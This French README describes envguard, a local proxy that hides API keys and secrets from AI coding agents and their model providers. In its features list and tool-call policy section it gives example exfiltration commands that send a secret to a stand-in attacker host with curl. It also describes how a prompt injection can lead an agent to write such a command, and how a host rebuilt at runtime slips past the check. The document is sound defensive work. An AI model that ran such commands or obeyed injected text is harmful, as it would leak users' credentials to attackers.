# envguard

**Un proxy local qui empêche vos clés d'API et vos secrets d'atteindre les modèles d'IA.**

Les agents de code (Claude Code, Codex, Gemini CLI, aider…) lisent vos fichiers `.env`, vos configurations et vos sorties de commandes, et envoient tout au fournisseur du modèle. envguard s'intercale : il remplace chaque secret par un placeholder avant l'envoi, puis remet la vraie valeur dans la réponse. Le modèle travaille normalement, mais ne voit jamais la valeur réelle de vos secrets.

[![Go](https://img.shields.io/badge/Go-1.27-00ADD8?logo=go&logoColor=white)](go.mod)
[![Licence MIT](https://img.shields.io/badge/licence-MIT-green)](LICENSE)

```
  votre agent                    envguard                       fournisseur
 ─────────────                ─────────────                   ─────────────
 sk-ant-api03-Xy…  ────────▶  masque        ────────▶  sk-ant-REDACTED_3c93161e
 sk-ant-api03-Xy…  ◀────────  réhydrate     ◀────────  sk-ant-REDACTED_3c93161e
```

```bash
envguard run -- claude
```

## Pourquoi

- **Votre clé reste chez vous.** Le fournisseur, ses journaux et ses éventuelles fuites ne voient que des placeholders.
- **L'agent n'est pas gêné.** Les réponses, les commandes et les appels d'outils reçoivent la vraie valeur, réhydratée côté poste, y compris en streaming.
- **Les tentatives d'exfiltration visibles sont bloquées** : dans un appel d'outil, une clé n'est remise que vers une destination légitime, et pas vers le domaine qu'une injection de prompt aurait glissé dans la commande.
- **Aucun réglage pour commencer.** `envguard run` démarre l'outil, configure les URL et s'arrête avec lui.

## Fonctionnalités

- **Détection** : règles natives rapides (~45 préfixes de clés connus, JWT, clés PEM, mots de passe d'URL, `API_KEY=…`, jetons Bearer, marquage `# secret:`), **~210 règles [gitleaks](https://github.com/gitleaks/gitleaks)**, et les valeurs de vos **fichiers `.env`**, masquées partout même sans motif reconnaissable.
- **Réhydratation fidèle** : placeholders stables (même secret, même placeholder), ce qui préserve le prompt caching, et streaming géré même quand un placeholder est coupé entre deux paquets.
- **Politique des appels d'outils** : bloque `curl https://attaquant/?k=<placeholder>`, laisse passer `DB_PASSWORD=<placeholder> npm test`.
- **17 fournisseurs** : Anthropic, OpenAI (Chat et Responses), Gemini natif, DeepSeek, Meta, xAI, Mistral, Groq, OpenRouter, Together, Fireworks, Qwen, Moonshot, Z.ai, Perplexity, Cohere, Ollama, et tout fournisseur compatible OpenAI.
- **Rapide** : ~0,3 ms ajoutée par requête, 0,6 ms pour un tour de conversation de 1,5 Mo grâce au cache par message.
- **Durci** : requêtes de navigateur refusées, corps compressés gérés, placeholders HMAC à clé locale, fuzzing et `-race`.
- **Interface** : TUI dans le terminal, mode sans interface, ou `envguard run`.

## Installation

```bash
go install github.com/NetSo8/envguard@latest
```

Ou depuis les sources :

```bash
git clone https://github.com/NetSo8/envguard && cd envguard && go build -o envguard .
```

Nécessite Go 1.27 ou plus récent.

## Démarrage rapide

**Avec un agent** : envguard lance l'outil derrière lui et s'arrête avec lui.

```bash
envguard run -- claude
```

```bash
envguard run -- codex
```

- **Variables d'environnement :** l'outil reçoit `ANTHROPIC_BASE_URL`, `OPENAI_BASE_URL`, `OPENAI_API_BASE` et `GOOGLE_GEMINI_BASE_URL`, pointées vers un proxy sur un port libre.
- **URL de base déjà définie** (passerelle d'entreprise…) : envguard s'insère devant au lieu de l'écraser.
- **À la sortie :** un résumé s'affiche, réhydratations bloquées comprises. Le journal va dans `<config>/envguard/run.log`, sans jamais écrire de secret.
- **Code de sortie :** celui de l'outil est transmis.

**En proxy permanent, avec la TUI :**

```bash
envguard
```

Il écoute alors sur `127.0.0.1:8787`, avec une route par fournisseur :

```bash
ANTHROPIC_BASE_URL=http://127.0.0.1:8787/anthropic claude
```

Chaque fournisseur dispose de sa propre route (`/anthropic`, `/openai`, `/gemini`, etc.).

**Pour un serveur MCP (Model Context Protocol) :** envguard s'intercale sur stdio (JSON-RPC) pour filtrer les sorties des outils (bases de données, fichiers, fetch...) et sécuriser les entrées :

```bash
envguard mcp -- npx @modelcontextprotocol/server-postgres "postgresql://localhost/mydb"
```

### ⚡ Protection automatique en un clic (`envguard protect`)

Pour les développeurs qui ne veulent pas éditer manuellement des fichiers JSON enfouis dans le système :

```bash
# Détecte et sécurise automatiquement tous vos serveurs MCP existants
envguard protect

# Voir l'état de protection sans rien modifier
envguard status

# Revenir aux configurations d'origine à tout moment
envguard unprotect
```

`envguard protect` scanne et sécurise instantanément les configurations de :
- **Cursor** (`~/.cursor/mcp.json`, `.cursor/mcp.json`)
- **Claude Desktop** (`claude_desktop_config.json`)
- **Claude Code** (`~/.claude.json`, `.claude.json`)
- **Trae** (ByteDance : `~/.trae/mcp.json`, `.trae/mcp.json`)
- **Tous les IDE JetBrains** (IntelliJ, PyCharm, WebStorm, GoLand, CLion, Rider, RustRover, Fleet : `.idea/mcp.json`, `options`)
- **Google Antigravity** (`~/.gemini/config/mcp_config.json`, `~/.antigravity/mcp.json`)
- **OpenCode** (`~/.config/opencode/opencode.jsonc`, `opencode.json`)
- **Windsurf** (`~/.codeium/windsurf/mcp_config.json`, `.windsurf/mcp.json`)
- **VS Code & Extensions** (Cline, Roo Code, Continue, Copilot MCP)
- **Zed** (`~/.config/zed/settings.json`)
- **Projets locaux** (`.mcp.json`, `mcp.json`)

Une sauvegarde automatique `.envguard.bak` de chaque fichier est créée avant toute modification.

### Configuration manuelle

Si vous préférez configurer votre client manuellement (`claude_desktop_config.json` ou `.mcp.json`) :

```json
{
  "mcpServers": {
    "postgres": {
      "command": "envguard",
      "args": ["mcp", "--", "npx", "-y", "@modelcontextprotocol/server-postgres", "postgresql://localhost/mydb"]
    }
  }
}
```

- **Sorties masquées :** chaque secret renvoyé par un outil MCP est masqué par un placeholder HMAC avant d'entrer dans le contexte de l'agent.
- **Entrées protégées :** la politique d'appels d'outils (blocage d'exfiltration réseau et protection des fichiers source) s'applique aux arguments transmis au serveur.
- **Journal :** écrit dans `<config>/envguard/mcp.log` (stdout restant strictement réservé aux messages JSON-RPC du protocole).

## Comment ça marche

1. **Requête** : le corps JSON est scanné en un passage, sans expression régulière pour les règles natives. Les secrets trouvés reçoivent un placeholder qui garde leur préfixe (`sk-ant-REDACTED_3c93161e`), dérivé d'un HMAC avec une clé locale. Une consigne ajoutée au system prompt demande au modèle de recopier les placeholders tels quels.
2. **Cache** : une conversation est renvoyée en entier à chaque tour. Chaque message masqué est mémorisé, et seuls les nouveaux sont scannés.
3. **Réponse** : les placeholders sont remplacés par les vraies valeurs, y compris en streaming SSE (Anthropic, OpenAI Chat et Responses, Gemini), où un placeholder peut être coupé entre deux paquets.
4. **Appels d'outils** : dans les arguments d'un outil, la valeur n'est remise que si chaque hôte cité est une destination légitime pour ce secret.

## Ce qui est détecté

| Type | Exemples |
|---|---|
| Clés à préfixe connu | `sk-ant-`, `sk-proj-`, `sk-svcacct-`, `sk-or-v1-`, `sk-`, `xai-`, `pplx-`, `AIza`, `gsk_`, `hf_`, `r8_`, `ghp_`/`gho_`/`ghs_`/`ghu_`/`ghr_`, `github_pat_`, `glpat-`, `glptt-`, `xoxb-`/`xoxp-`/`xoxa-`/`xoxr-`/`xoxs-`, `xapp-`, `AKIA`, `ASIA`, `sk_live_`, `rk_live_`, `sk_test_`, `whsec_`, `npm_`, `pypi-`, `dckr_pat_`, `shpat_`…, `dop_v1_`, `lin_api_`, `ntn_`, `SG.`, `hvs.`, `dp.pt.` |
| JWT | `eyJ….eyJ….signature` (trois segments) |
| Clés privées PEM | chaque ligne base64 entre `-----BEGIN … PRIVATE KEY-----` et `-----END` |
| Mots de passe dans les URL | `postgres://user:motdepasse@hôte` (pas les `${VARIABLE}`) |
| Jetons Bearer | `Authorization: Bearer <jeton>` sans préfixe connu |
| Assignations | `API_KEY=…`, `db_password: "…"`, `auth_header = …` (valeur ≥ 12 caractères et entropie élevée) |
| Marquage manuel | `host = "interne" # secret:` ou `# secret: valeur` (aussi avec `//`) |

Exclus automatiquement : hashes hexadécimaux (commits), UUID, nombres, certificats publics, variables (`${…}`), placeholders déjà masqués. Pour un faux positif : touche `a` dans l'onglet Secrets de la TUI.

## Fichiers `.env`

Au démarrage, envguard lit les fichiers `.env`, `.env.local`, `.env.production`, `.envrc`… du dossier courant (ou ceux passés par `-env-file`) et les surveille. Chaque valeur qui ressemble à un secret est enregistrée telle quelle : elle est ensuite masquée **partout** où elle apparaît, même dans du texte où rien ne permettrait de la reconnaître.

Pour ne pas masquer des mots ordinaires, seules sont retenues :
- les variables au nom évocateur (`KEY`, `SECRET`, `TOKEN`, `PASSW`, `AUTH`…) ;
- les valeurs reconnues par une règle ;
- les valeurs longues à forte entropie.

Sont ignorés : les fichiers d'exemple (`.env.example`, `.env.sample`, `.env.template`…), les valeurs banales (`development`, `true`, `3000`, `localhost`…) et les chemins. Pour une URL (`DATABASE_URL=postgres://user:mdp@hôte/db`), seul le mot de passe est masqué, et son hôte devient sa destination légitime.

## Politique de réhydratation des appels d'outils

Le modèle ne connaît pas la valeur d'un secret, mais il connaît son placeholder. Une injection de prompt (page web lue, fichier piégé…) peut lui faire écrire `curl https://attaquant.example/?k=sk-ant-REDACTED_…`. Une réhydratation aveugle enverrait alors le vrai secret à l'attaquant.

Dans les **arguments d'un appel d'outil**, quel que soit le format (`tool_use` Anthropic, `tool_calls` OpenAI, `function_call` Responses, `functionCall` Gemini), un placeholder n'est remis que si **chaque hôte réseau cité dans l'appel** est une destination légitime pour ce secret :

| Secret | Destinations légitimes |
|---|---|
| Clé à préfixe connu | le fournisseur (`sk-ant-` → `anthropic.com`, `ghp_` → `github.com`, `AKIA` → `amazonaws.com`…) |
| Mot de passe d'URL | l'hôte de l'URL d'origine |
| Tout secret | les hôtes ajoutés par `-allow-host type=hôte` |
| Appel sans destination visible | toujours autorisé (`DB_PASSWORD=… npm test`) |

Sinon, le placeholder reste tel quel : la commande échoue sans fuite, et la TUI (ou le résumé de `envguard run`) indique l'option à ajouter si l'appel était légitime.

```bash
./envguard run -allow-host env:API_TOKEN=api.mycompany.com -- claude
```

Le type d'un secret apparaît dans la TUI : `env:NOM`, `generic`, `url_password`, `gitleaks:<règle>`… La forme courte (`env`, `gitleaks`) et `*` sont acceptées. Le texte affiché à l'utilisateur est toujours réhydraté normalement.

- **Retenue en streaming :** dès qu'un placeholder apparaît dans des arguments, la suite de l'appel est retenue jusqu'à sa fin, car le domaine visé peut arriver après le placeholder.
- **Variantes base64 :** un placeholder encodé en base64 n'est jamais réhydraté dans un appel d'outil.
- **Protection des fichiers (Filesystem Leak Guard) :** si un appel d'outil tente d'écrire un secret dans un fichier (`write_to_file`, `str_replace_editor`, champs `path` + `content`, redirections shell `> fichier`, `>> fichier`, `tee`, ou `git commit`), la réhydratation est bloquée pour éviter d'inscrire le secret en clair dans le code source ou l'historique Git. Les commandes éphémères (`DB_PASSWORD=… npm test`, redirections `> /dev/null 2>&1`) restent autorisées. Pour autoriser l'écriture : `-allow-host type=file` ou `-no-file-guard`.
- **Limite :** c'est une défense contre les exfiltrations visibles. Une commande qui reconstruit l'hôte à l'exécution (`$(echo … | base64 -d)`) n'est pas détectable ici.

`-tool-policy warn` remet le secret mais signale l'appel ; `-tool-policy off` revient à l'ancien comportement.

## Règles gitleaks

Les règles du projet [gitleaks](https://github.com/gitleaks/gitleaks) (licence MIT, copie dans `third_party/gitleaks`) sont intégrées au binaire : environ 210 types de secrets en plus des règles natives.

- **Exclusions :** `generic-api-key`, `jwt` et `private-key` sont exclues. envguard a ses propres détecteurs pour ces trois cas, plus rapides et adaptés au JSON.
- **Garde-fou :** une valeur trouvée est masquée partout ensuite. On exige donc 10 caractères imprimables au moins, sans guillemet ni backslash, et une entropie minimale.
- **Écart avec gitleaks :** les mots-clés sont cherchés en début de mot, après un séparateur ou sur une transition camelCase.

Pour mettre les règles à jour :

```bash
cd third_party/gitleaks && curl -sfLo gitleaks.toml https://raw.githubusercontent.com/gitleaks/gitleaks/master/config/gitleaks.toml && python3 convert.py
```

## Sécurité

- **Requêtes de navigateur refusées** : un en-tête `Origin` ou `Sec-Fetch-Site: cross-site` donne un 403 (sauf `-allow-origin`). Un `Host` non local aussi, contre le DNS rebinding. Les en-têtes CORS de l'amont ne sont jamais relayés.
- **Corps compressés** : gzip et deflate sont décompressés avant masquage ; tout autre encodage est refusé (415), jamais relayé en aveugle.
- **Placeholders à clé** : HMAC-SHA256 avec une clé locale. Un placeholder ne permet pas de vérifier hors ligne un secret deviné.

## Performances

| Mesure | Résultat |
|---|---|
| Latence ajoutée, requête de 64 Ko | ~0,3 ms |
| Tour de conversation de 1,5 Mo (cache par message) | ~0,6 ms |
| Scan (règles natives / avec gitleaks) | ~500 / ~315 Mo/s, sans allocation |
| Réhydratation | ~1,2 Go/s, sans allocation |
| Coût du streaming, par événement | 0,04 à 1 µs |
| Mémoire en usage | 15 à 35 Mo |

Un appel à un modèle dure de 1 à 60 secondes : le surcoût est imperceptible.

## Options

Toutes les options s'appliquent à `envguard`, `envguard run` et `envguard mcp`.

| Option | Défaut | Rôle |
|---|---|---|
| `-listen` | `127.0.0.1:8787` (`run` : port libre) | adresse d'écoute |
| `-provider nom=url` | — | ajoute ou surcharge un fournisseur (répétable) |
| `-env-file fichier` | les `.env*` du dossier courant | fichier `.env` dont les valeurs sont masquées (répétable) |
| `-no-env` | `false` | ne pas lire les `.env` du dossier courant |
| `-tool-policy` | `strict` | réhydratation dans les appels d'outils : `strict`, `warn` ou `off` |
| `-no-file-guard` | `false` | ne pas bloquer l'écriture de secrets dans les fichiers |
| `-allow-host type=hôte` | — | destination autorisée pour un type de secret (répétable), ex. `env:API_TOKEN=api.exemple.com` (ou `type=file`) |
| `-no-gitleaks` | `false` | désactiver les règles gitleaks |
| `-gitleaks-exclude id` | — | ignorer une règle gitleaks (répétable) |
| `-allow` | `~/.envguard_allow` | allowlist (envguard n'y écrit que des HMAC, jamais le secret en clair) |
| `-key` | `<config>/envguard/key` | clé qui dérive les placeholders (créée au premier lancement, `0600`) |
| `-allow-origin URL` | — | origine navigateur autorisée, ex. `http://localhost:3000` (répétable) |
| `-max-body` | `268435456` | taille max d'un corps de requête, en octets |
| `-log` | `<config>/envguard/run.log` (`mcp` : `mcp.log`) | journal d'exécution |
| `-no-hint` | `false` | n'injecte pas la consigne « recopie les placeholders tels quels » |
| `-no-tui` | `false` | logs sur stderr au lieu de la TUI |

`<config>` est `~/Library/Application Support` sur macOS et `~/.config` sur Linux.

## TUI

| Touche | Action |
|---|---|
| `tab` | basculer Activité / Secrets |
| `↑` `↓` / `j` `k` | naviguer dans les secrets |
| `a` | ajouter le secret sélectionné à l'allowlist |
| `p` / `espace` | mettre en pause le masquage |
| `q` | quitter |

## Limites

- Un placeholder que le modèle réécrit (casse changée, découpage, encodage autre que base64) n'est pas réhydraté.
- Un secret maison sans préfixe ni nom de variable explicite, absent des `.env`, passe à travers : utilise `# secret:` ou `-env-file`.
- La politique des outils bloque les exfiltrations visibles, pas une commande qui reconstruit l'hôte à l'exécution.
- Les API natives de Cohere (v2) et d'Ollama (`/api/chat`) ne sont pas gérées en streaming.
- Développé et testé sur macOS. Le code compile pour Linux et Windows, mais n'y a pas encore été testé.

## Feuille de route

Par ordre d'intérêt :

1. **Valider sur une vraie session d'agent.** Les tests simulent les quatre formats de streaming, mais aucune session réelle de Claude Code ou Codex avec une clé d'API n'est encore passée par envguard. C'est la prochaine étape, avant toute nouvelle fonctionnalité : elle dira si la politique des outils bloque à tort des appels courants.
2. **Fichier de configuration** (`~/.config/envguard/config.toml`) : fournisseurs, `-allow-host`, `-env-file` et règles maison versionnés, au lieu d'une ligne de commande qui s'allonge.
3. **`envguard attach`** : afficher la TUI d'un `envguard run` en cours dans un second terminal, pour voir les masquages et les blocages en direct.
4. **Secrets pièges** : de faux secrets glissés dans le contexte. Si l'agent tente de s'en servir, c'est une injection de prompt, y compris dans les cas que la politique ne voit pas (hôte reconstruit à l'exécution).
5. **Documents encodés** : décoder les pièces jointes texte en base64 (bloc `document` d'Anthropic, fichiers OpenAI) avant le scan ; aujourd'hui, un `.env` joint ainsi n'est pas lu.
6. **Distribution** : intégration continue (tests, `-race`, fuzzing court), binaires signés via goreleaser, formule Homebrew. Le code compile déjà pour Linux et Windows, mais `envguard run` n'a été testé que sur macOS.
7. **Journal d'audit** JSONL sans aucun secret, et **mode blocage** (refuser une requête au lieu de masquer, pour les clés les plus sensibles).


## Développement

```bash
go test ./...
```

```bash
go test -race ./...
```

```bash
go test -run '^$' -fuzz FuzzSSE -fuzztime 60s .
```

```bash
go test -run x -bench . .
```

Les faux secrets des tests sont écrits en deux morceaux concaténés (`"SG" + ".ngeV…"`) : écrits d'un seul tenant, la protection anti-fuite de GitHub les prendrait pour de vrais secrets et bloquerait la publication.

## Licence

[MIT](LICENSE). Les règles de détection de [gitleaks](https://github.com/gitleaks/gitleaks) sont incluses sous leur propre licence MIT, dans [third_party/gitleaks](third_party/gitleaks).
